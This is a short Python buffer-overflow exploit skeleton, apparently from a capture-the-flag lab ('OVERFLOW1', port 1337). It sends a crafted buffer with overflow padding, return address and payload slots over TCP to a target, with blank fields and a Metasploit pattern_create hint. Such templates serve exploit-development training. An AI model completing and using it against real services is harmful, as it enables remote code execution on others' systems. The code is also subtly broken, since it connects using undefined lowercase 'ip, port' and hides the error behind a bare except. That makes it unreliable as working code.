#!/usr/bin/python3

import socket

IP = "TARGET-IP"
PORT = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "" # insert pattern here from '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <patterns>
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending payload . . .")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("There was a problem while connecting to application!")
